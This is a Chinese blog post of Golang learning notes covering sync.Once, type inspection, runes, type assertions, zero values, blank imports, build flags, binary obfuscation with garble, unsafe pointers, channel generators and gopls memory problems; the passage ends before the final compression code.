<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <meta charset="utf-8" />
        
      <meta name="description" content="CrossTime的个人博客" />
      
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title> CrossTime的个人博客</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css"
      />
      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    </head>
  </html>
</html>


<body>
  <div id="app">
    
      
    <main class="content on">
      
<section class="cover">
    
  <div class="cover-frame">
    <div class="bg-box">
      <img src="/images/image.jpeg" alt="image frame" />
    </div>
    <div class="cover-inner text-center text-white">
      <h1><a href="/">CrossTime的个人博客</a></h1>
      <div id="subtitle-box">
        
          <span id="subtitle"></span>
        
      </div>
      <div>
        
      </div>
    </div>
  </div>
  <div class="cover-learn-more">
    <a href="javascript:void(0)" class="anchor"><i class="ri-arrow-down-line"></i></a>
  </div>
</section>




<!-- Subtitle -->

<div id="main">
  <section class="outer">
  
  
  

<div class="notice" style="margin-top:50px">
    <i class="ri-heart-fill"></i>
    <div class="notice-content" id="broad"></div>
</div>
<script type="text/javascript">
    fetch('https://v1.hitokoto.cn')
        .then(response => response.json())
        .then(data => {
            document.getElementById("broad").innerHTML = data.hitokoto;
        })
        .catch(console.error)
</script>

<style>
    .notice {
        padding: 20px;
        border: 1px dashed #e6e6e6;
        color: #969696;
        position: relative;
        display: inline-block;
        width: 100%;
        background: #fbfbfb50;
        border-radius: 10px;
    }

    .notice i {
        float: left;
        color: #999;
        font-size: 16px;
        padding-right: 10px;
        vertical-align: middle;
        margin-top: -2px;
    }

    .notice-content {
        display: initial;
        vertical-align: middle;
    }
</style>
  
  <article class="articles">
    
    
    
    
    <article
  id="post-study-golang-record-3"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/05/03/study-golang-record-3/"
    >Golang学习记录之三</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/05/03/study-golang-record-3/" class="article-date">
  <time datetime="2022-05-03T17:38:41.000Z" itemprop="datePublished">2022-05-03</time>
</a>    
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="Golang学习记录之三"><a href="#Golang学习记录之三" class="headerlink" title="Golang学习记录之三"></a>Golang学习记录之三</h1><p>​    golang开发的的又一篇补充，比之前多了3条，懒得开新的，索性合并一起了 （＞人＜；）</p>
<h2 id="1、创建configure的结构体"><a href="#1、创建configure的结构体" class="headerlink" title="1、创建configure的结构体"></a>1、创建configure的结构体</h2><p>如果程序有配置信息需要存储，可以定义一个构造函数返回</p>
<p>结合sync.Once变量定义一个构造函数来存储配置，示例代码如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> conf</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> once sync.Once</span><br><span class="line"><span class="comment">// Config类型为用户自己定义的存储配置的结构体，config为变量</span></span><br><span class="line"><span class="keyword">var</span> config *Config</span><br><span class="line"></span><br><span class="line"><span class="comment">// config一次性定义</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Instance</span><span class="params">()</span></span> *Config &#123;</span><br><span class="line">    <span class="comment">// once 为sync.Once类型，参数为函数，用于给全局变量config赋值</span></span><br><span class="line">    <span class="comment">// sync.Once的作用在于只执行一次，如果第二次调用Instance函数，则直接返回config变量</span></span><br><span class="line">    once.Do(<span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        config = &amp;Config&#123;&#125;</span><br><span class="line">        <span class="comment">// 比如配置里有一项线程数，默认为10</span></span><br><span class="line">        config.ThreadNum = <span class="number">10</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> config</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 其他package调用方式，第一次调用会执行func()里的赋值语句，第二次直接返回config</span></span><br><span class="line">conf.Instance().ThreadNum</span><br></pre></td></tr></table></figure>





<h2 id="2、获取变量的类型"><a href="#2、获取变量的类型" class="headerlink" title="2、获取变量的类型"></a>2、获取变量的类型</h2><p>如果某个函数的入参是interface{}，有下面几种方式可以获取入参的方法</p>
<p><strong>1）fmt</strong></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    v := <span class="string">&quot;hello world&quot;</span></span><br><span class="line">    fmt.Println(typeof(v))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">typeof</span><span class="params">(v <span class="keyword">interface</span>&#123;&#125;)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;%T&quot;</span>, v)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 运行结果：</span></span><br><span class="line"><span class="type">string</span></span><br></pre></td></tr></table></figure>

<p><strong>2）反射</strong></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;reflect&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    v := <span class="string">&quot;hello world&quot;</span></span><br><span class="line">    fmt.Println(typeof(v))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">typeof</span><span class="params">(v <span class="keyword">interface</span>&#123;&#125;)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> reflect.TypeOf(v).String()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 运行结果：</span></span><br><span class="line"><span class="type">string</span></span><br></pre></td></tr></table></figure>

<p><strong>3）类型断言</strong></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    v := <span class="string">&quot;hello world&quot;</span></span><br><span class="line">    fmt.Println(typeof(v))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">typeof</span><span class="params">(v <span class="keyword">interface</span>&#123;&#125;)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> t := v.(<span class="keyword">type</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="type">int</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;int&quot;</span></span><br><span class="line">    <span class="keyword">case</span> <span class="type">float64</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;float64&quot;</span></span><br><span class="line">    <span class="keyword">case</span> <span class="type">string</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;string&quot;</span></span><br><span class="line">    <span class="comment">//... etc</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        _ = t</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;unknown&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 运行结果：</span></span><br><span class="line"><span class="type">string</span></span><br></pre></td></tr></table></figure>



<h2 id="3、rune"><a href="#3、rune" class="headerlink" title="3、rune"></a>3、rune</h2><p> []rune(s), 它可以将字符串转化成 unicode 码点</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 与byte区别</span></span><br><span class="line">first := <span class="string">&quot;fisrt&quot;</span></span><br><span class="line">fmt.Println([]<span class="type">rune</span>(first))</span><br><span class="line">fmt.Println([]<span class="type">byte</span>(first))</span><br><span class="line"></span><br><span class="line">[<span class="number">102</span> <span class="number">105</span> <span class="number">115</span> <span class="number">114</span> <span class="number">116</span>] <span class="comment">// 输出结果 [] rune</span></span><br><span class="line">[<span class="number">102</span> <span class="number">105</span> <span class="number">115</span> <span class="number">114</span> <span class="number">116</span>] <span class="comment">// 输出结果 [] byte</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// byte is an alias for uint8 and is equivalent to uint8 in all ways. It is</span></span><br><span class="line"><span class="comment">// used, by convention, to distinguish byte values from 8-bit unsigned</span></span><br><span class="line"><span class="comment">// integer values.</span></span><br><span class="line"><span class="keyword">type</span> <span class="type">byte</span> = <span class="type">uint8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// rune is an alias for int32 and is equivalent to int32 in all ways. It is</span></span><br><span class="line"><span class="comment">// used, by convention, to distinguish character values from integer values.</span></span><br><span class="line"><span class="keyword">type</span> <span class="type">rune</span> = <span class="type">int32</span></span><br><span class="line"><span class="comment">// 原来是 byte 表示一个字节，rune 表示四个字节</span></span><br></pre></td></tr></table></figure>

<p>在中文字符串截取方面，使用rune截取</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s := <span class="string">&quot;今天天气真好&quot;</span></span><br><span class="line">res := []<span class="type">rune</span>(s)</span><br><span class="line">fmt.Println(<span class="type">string</span>(res[:<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 运行结果：</span></span><br><span class="line">今天   <span class="comment">// 顺利截取了</span></span><br></pre></td></tr></table></figure>



<h2 id="4、强制类型转换"><a href="#4、强制类型转换" class="headerlink" title="4、强制类型转换"></a>4、强制类型转换</h2><p>类型断言是一个使用在接口值上的操作。语法上它看起来像 i.(T) 被称为断言类型，这里 i 表示一个接口的类型和 T 表示一个类型一个类型断言检查它操作对象的动态类型是否和断言的类型匹配</p>
<p>类型断言的基本格式如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">t := i.(T)</span><br><span class="line"><span class="comment">// 其中，i 代表接口变量，T 代表转换的目标类型，t 代表转换后的变量</span></span><br></pre></td></tr></table></figure>

<p>这里有两种可能。第一种，如果断言的类型 T 是一个具体类型，然后类型断言检查 i 的动态类型是否和 T 相同。如果这个检查成功了，类型断言的结果是 i 的动态值，当然它的类型是 T。换句话说，具体类型的类型断言从它的操作对象中获得具体的值。如果检查失败，接下来这个操作会抛出 panic</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> w io.Writer</span><br><span class="line">w = os.Stdout</span><br><span class="line">rw := w.(io.ReadWriter) <span class="comment">// 成功：*os.file具有读写功能</span></span><br><span class="line">w = <span class="built_in">new</span>(bytes.Reader)</span><br><span class="line">rw = w.(io.ReadWriter) <span class="comment">// 死机：*bytes.Reader没有读取方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 运行结果：</span></span><br><span class="line">./test.<span class="keyword">go</span>:<span class="number">204</span>:<span class="number">4</span>: cannot use <span class="built_in">new</span>(bytes.Reader) (<span class="keyword">type</span> *bytes.Reader) as <span class="keyword">type</span> io.Writer in assignment:</span><br><span class="line">      *bytes.Reader does not implement io.Writer (missing Write method)   <span class="comment">// 缺失write方法</span></span><br></pre></td></tr></table></figure>

<p>如果 i 没有完全实现 T 接口的方法，这个语句将会触发宕机。触发宕机不是很友好，因此上面的语句还有一种写法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">t,ok := i.(T)</span><br><span class="line"><span class="keyword">if</span> ok &#123;</span><br><span class="line">    <span class="comment">// 转换成功</span></span><br><span class="line">    ...</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 转换失败</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种写法下，如果发生接口未实现时，将会把 ok 置为 false，t 置为 T 类型的 0 值。正常实现时，ok 为 true</p>
<p>这里 ok 可以被认为是：i 接口是否实现 T 类型的结果</p>
<h2 id="5、golang变量的默认值"><a href="#5、golang变量的默认值" class="headerlink" title="5、golang变量的默认值"></a>5、golang变量的默认值</h2><p>Go语言将数据类型分为四类：基础类型、复合类型、引用类型和接口类型</p>
<h4 id="1-基础类型"><a href="#1-基础类型" class="headerlink" title="1) 基础类型"></a>1) 基础类型</h4><p><strong>整形</strong></p>
<p>有符号整形 int8 int16 int32 int64 默认值 0</p>
<p>无符号整形 uint8 uint16 uint32 uint64 默认值 0</p>
<p>特殊整形 int uint byte rune uintptr 默认值 0</p>
<p><strong>浮点型</strong></p>
<p>浮点型数 float32 float64 默认值 0.0</p>
<p>复数类型 complex64 complex128 默认值 0+0i</p>
<p>布尔类型 true false 默认值 false</p>
<p>字符串类型 string 默认值 “”</p>
<p><strong>复合类型</strong></p>
<p>数组类型 [SIZE]TYPE 默认值根据数组类型变化而变化 如 [3]int 为 [0,0,0]</p>
<p>结构体类型 struct 默认值根据随结构体内部类型变化而变化，如下默认值为{ 0} 即 Name为”” Age为0</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line"> 	Name <span class="type">string</span></span><br><span class="line"> 	Age  <span class="type">int</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p><strong>引用类型</strong></p>
<p>指针 *TYPE 默认值 nil</p>
<p>切片 []TYPE 默认值 nil</p>
<p>字典 map 默认值 nil</p>
<p>通道 chan 默认值 nil</p>
<p>函数 func 默认值 nil</p>
<p><strong>接口类型</strong></p>
<p>接口 interface 默认值 nil</p>
<p>这里要特别注意 nil</p>
<p>在 Go 中不同类型的 nil 是无法比较的，他们的大小也不一样</p>
<p>引用类型中的 slice map chan 要使用 make 函数初始化，如果常规 var NAME TYPE 的方式声明，将不能通过正常的赋值方法来修改默认值</p>
<h2 id="6、import"><a href="#6、import" class="headerlink" title="6、import"></a>6、import</h2><p>import 下划线（如：import _ hello&#x2F;imp）的作用：当导入一个包时，该包下的文件里所有init()函数都会被执行，然而，有些时候我们并不需要把整个包都导入进来，仅仅是是希望它执行init()函数而已。这个时候就可以使用 import _ 引用该包。即使用 import _ 包路径 只是引用该包，仅仅是为了调用init()函数，所以无法通过包名来调用包中的其他函数，示例代码如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 目录结构：</span></span><br><span class="line"><span class="comment">// - test1</span></span><br><span class="line"><span class="comment">//   - test1.go</span></span><br><span class="line"><span class="comment">// - test2</span></span><br><span class="line"><span class="comment">//   - test2.go</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// test1.go</span></span><br><span class="line"><span class="keyword">package</span> test1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;import test1 success&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Test</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;for test&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// test1.go</span></span><br><span class="line"><span class="keyword">package</span> test2</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">    _ <span class="string">&quot;test1&quot;</span>   <span class="comment">// golang的import可以给引入的package设置别名（为了防止有重名package的情况），别名可以为下划线</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">run</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// _.Test() 会报错，无法通过下划线来调用模块内的函数</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;done&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 运行结果：</span></span><br><span class="line"><span class="keyword">import</span> test1 success</span><br><span class="line">done</span><br></pre></td></tr></table></figure>



<h2 id="7、无限缓存的channel"><a href="#7、无限缓存的channel" class="headerlink" title="7、无限缓存的channel"></a>7、无限缓存的channel</h2><p>一般再定义channel时是没有缓存的，即通道channel内只有1个变量，如果没有取出变量则会堵塞</p>
<p>可以在定义channel时设置缓存长度，但也是有限的，如果达到容量上限，也会造成堵塞，如果我们不想堵塞的话只能手动</p>
<p>经过网上搜索，找到一个定义了无限容量缓存结构体的channel：<a target="_blank" rel="noopener" href="https://github.com/smallnest/chanx">https://github.com/smallnest/chanx</a></p>
<p>这个库的原理是定义了一个环形数组ringbuffer，将读完的数据直接覆盖；当缓存长度达到数组长度时再自动创建更大容量的数组，可以减少底层复制的次数，提高效率</p>
<h2 id="8、C语言中数据类型与go中的数据类型的对应关系"><a href="#8、C语言中数据类型与go中的数据类型的对应关系" class="headerlink" title="8、C语言中数据类型与go中的数据类型的对应关系"></a>8、C语言中数据类型与go中的数据类型的对应关系</h2><p>左为C语言数据类型，右为golang数据类型（golang重写一些C语言项目时可能会用到）</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> (</span><br><span class="line">	BOOL          <span class="type">uint32</span></span><br><span class="line">	BOOLEAN       <span class="type">byte</span></span><br><span class="line">	BYTE          <span class="type">byte</span></span><br><span class="line">	DWORD         <span class="type">uint32</span></span><br><span class="line">	DWORD64       <span class="type">uint64</span></span><br><span class="line">	HANDLE        <span class="type">uintptr</span></span><br><span class="line">	HLOCAL        <span class="type">uintptr</span></span><br><span class="line">	LARGE_INTEGER <span class="type">int64</span></span><br><span class="line">	LONG          <span class="type">int32</span></span><br><span class="line">	LPVOID        <span class="type">uintptr</span></span><br><span class="line">	SIZE_T        <span class="type">uintptr</span></span><br><span class="line">	UINT          <span class="type">uint32</span></span><br><span class="line">	ULONG_PTR     <span class="type">uintptr</span></span><br><span class="line">	ULONGLONG     <span class="type">uint64</span></span><br><span class="line">	WORD          <span class="type">uint16</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>



<h2 id="9、golang编译信息"><a href="#9、golang编译信息" class="headerlink" title="9、golang编译信息"></a>9、golang编译信息</h2><p>golang编译器在编译程序时会自动加入编译信息，根据这些编译信息可以使用ida结合脚本将函数名恢复出来</p>
<p>脚本地址：<a target="_blank" rel="noopener" href="https://github.com/strazzere/golang_loader_assist">https://github.com/strazzere/golang_loader_assist</a></p>
<p>ps：使用脚本的时候注意区分ida和python版本，对号入座</p>
<p>以上脚本仅支持golang1.15及以下编译的程序，golang1.16版本之后对编译方式进行了修改，上面的脚本不再适用</p>
<p>使用后面链接里的脚本即可，注意需要自己修改起始地址：<a target="_blank" rel="noopener" href="http://f5.pm/go-77540.html">http://f5.pm/go-77540.html</a></p>
<p>如果嫌编译信息多余，可以使用以下命令可以去掉多余的编译信息</p>
<p>go build -v -a -ldflags&#x3D;”-w -s” -trimpath</p>
<p>如果不想让别人恢复出来函数名等信息，可以对二进制程序进行混淆，我一般使用名为garble的第三方库：github.com&#x2F;burrowers&#x2F;garble</p>
<p>即使使用了上面的脚本，恢复出来的函数名也是经过混淆的</p>
<h2 id="10、unsafe包"><a href="#10、unsafe包" class="headerlink" title="10、unsafe包"></a>10、unsafe包</h2><p>在unsafe包官方定义里有四个描述：</p>
<p>1、任何类型的指针都可以被转化为Pointer</p>
<p>2、Pointer可以被转化为任何类型的指针</p>
<p>3、uintptr可以被转化为Pointer</p>
<p>4、Pointer可以被转化为uintptr</p>
<p>指向不同类型数据的指针，是无法直接相互转换的，必须借助unsafe.Pointer(类似于C的 void指针)代理一下再转换也就是利用上述的1，2规则</p>
<p>为什么字符串类型的 unsafe.Sizeof() 一直是16呢？</p>
<p>实际上字符串类型对应一个结构体，该结构体有两个域，第一个域是指向该字符串的指针，第二个域是字符串的长度，每个域占8个字节，但是并不包含指针指向的字符串的内容，这也就是为什么sizeof始终返回的是16。</p>
<p>组成可以理解成此结构体</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typedef <span class="keyword">struct</span> &#123;</span><br><span class="line">    char* buffer;</span><br><span class="line">    size_tlen;</span><br><span class="line"> &#125; <span class="type">string</span>;</span><br></pre></td></tr></table></figure>

<p>在红队的木马程序中经常会用到unsafe，现在也还没琢磨明白（〒▽〒）</p>
<p>这里先抛个砖，后续琢磨明白了再单独开一篇进行讲述</p>
<h2 id="11、golang实现python的yield生成器"><a href="#11、golang实现python的yield生成器" class="headerlink" title="11、golang实现python的yield生成器"></a>11、golang实现python的yield生成器</h2><p>主要原理是使用channel通道实现，示例代码如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">someGenerator</span><span class="params">()</span></span> <span class="keyword">chan</span> <span class="type">string</span> &#123;</span><br><span class="line">	channel := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>)</span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;                            <span class="comment">// 使用协程输入数据</span></span><br><span class="line">		channel &lt;- <span class="string">&quot;a&quot;</span>                     <span class="comment">// 向channel输入数据，该操作会堵塞直到main中的channel读取</span></span><br><span class="line">		fmt.Println(<span class="string">&quot;yield&quot;</span>, &lt;-channel)    <span class="comment">// 等待main的信号</span></span><br><span class="line">		fmt.Println(<span class="string">&quot;after a&quot;</span>)</span><br><span class="line">		channel &lt;- <span class="string">&quot;c&quot;</span>                     <span class="comment">// 输入下一个数据</span></span><br><span class="line">		fmt.Println(<span class="string">&quot;yield&quot;</span>, &lt;-channel)</span><br><span class="line">		fmt.Println(<span class="string">&quot;after c&quot;</span>)</span><br><span class="line">		channel &lt;- <span class="string">&quot;b&quot;</span></span><br><span class="line">		fmt.Println(<span class="string">&quot;yield&quot;</span>, &lt;-channel)</span><br><span class="line">		fmt.Println(<span class="string">&quot;after b&quot;</span>)</span><br><span class="line">		<span class="built_in">close</span>(channel)                     <span class="comment">// 关闭通道，让main中的循环退出</span></span><br><span class="line">	&#125;()</span><br><span class="line">	<span class="keyword">return</span> channel</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	channel := someGenerator()</span><br><span class="line">	<span class="keyword">for</span> val := <span class="keyword">range</span> channel &#123;       <span class="comment">// 读取数据，直到channel close</span></span><br><span class="line">		fmt.Println(<span class="string">&quot;main&quot;</span>, val)     <span class="comment">// 输出从协程输入到channel的数据</span></span><br><span class="line">		channel &lt;- <span class="string">&quot;2&quot;</span>               <span class="comment">// 发送信号，让协程插入下一个数据</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="12、gopls"><a href="#12、gopls" class="headerlink" title="12、gopls"></a>12、gopls</h2><p>gopls 实现了 VS Code 的 Language Server Protocol (LSP，即语言服务器协议，定义了在编辑器或 IDE 中与语言服务器之间使用的协议，该语言服务器提供诸如自动完成，转到定义，查找所有引用等语言功能)，本人使用vscode server进行golang开发，gopls能够自动补全函数和变量，转到函数定义，查找引用，十分方便</p>
<p>但是在某些场景下，使用vscode server+gopls开发golang会使服务器的cpu爆炸。。。 (* ￣︿￣)</p>
<p>有一天，我想把一个静态文件需要写到二进制程序里，由于只有一个文件，懒得用embed打包静态资源了，就想着把byte形式写入到文件里</p>
<p>但如果特别长的byte数组写到代码里（长度约178w。。），在进行后续代码修改时，gopls会占用超多内存和cpu性能，机器直接爆炸而卡死，我的4核8G服务器几度差点宕机。。</p>
<p>但是我之前使用felix将前端静态文件打包进二进制就没啥事，那些静态文件也不比我这个的小。。（不知道啥是felix的详见上一篇文章—golang开发之二的第7条）</p>
<p>经过一顿分析，发现人家使用的是字符串，还经过了gzip压缩；我这使用的是byte数组，直接由整个静态文件转换得来。。</p>
<p>由此，找到解决办法：将byte数组的内容使用gzip压缩，再以string的形式存储就OK了，压缩以后的string长度为45w</p>
<p>压缩代码如下：</p>
